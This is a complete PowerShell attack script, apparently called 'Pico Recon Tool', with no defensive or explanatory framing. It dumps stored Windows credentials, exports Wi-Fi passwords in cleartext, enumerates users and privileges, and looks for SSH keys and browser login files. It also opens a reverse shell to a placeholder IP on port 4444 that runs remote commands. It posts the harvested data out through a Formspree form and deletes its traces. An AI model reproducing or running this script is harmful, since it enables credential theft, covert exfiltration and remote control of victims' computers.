$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Windows.Forms

$creds = @()

cmdkey /list | Out-String | Out-File -FilePath "$env:TEMP\creds.txt" -Encoding ASCII

netsh wlan export profile key=clear folder="$env:TEMP" | Out-Null
Get-ChildItem "$env:TEMP\Wi-Fi-*.xml" | Select-String "keyMaterial" | Out-String

net user | Out-String
whoami /all | Out-String

$sshpath = "$env:USERPROFILE\.ssh"
if (Test-Path $sshpath) {
    Get-ChildItem $sshpath\*.pub,*.rsa | Get-Content | Out-String
}

$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$firefox = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

$harvest = Get-Content "$env:TEMP\creds.txt" -Raw
$harvest += "`n[LOCAL USERS]`n" + (net user | Out-String)
$harvest += "`n[PRIVS]`n" + (whoami /all | Out-String)

$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()

Add-Type -AssemblyName System.Web
$formData = @{
    'name' = 'Pico Recon Tool'
    'email' = 'target@compromised.local'
    'message' = $harvest.Substring(0, [Math]::Min(4000, $harvest.Length))  # Form limit
}

Invoke-WebRequest -Uri "https://formspree.io/f/YOUR_FORM_ID" -Method POST -Body $formData -UseBasicParsing | Out-Null

Remove-Item "$env:TEMP\creds.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Wi-Fi-*.xml" -Force -ErrorAction SilentlyContinue

Write-Output "[+] Beacon complete - creds exfiled to C2"
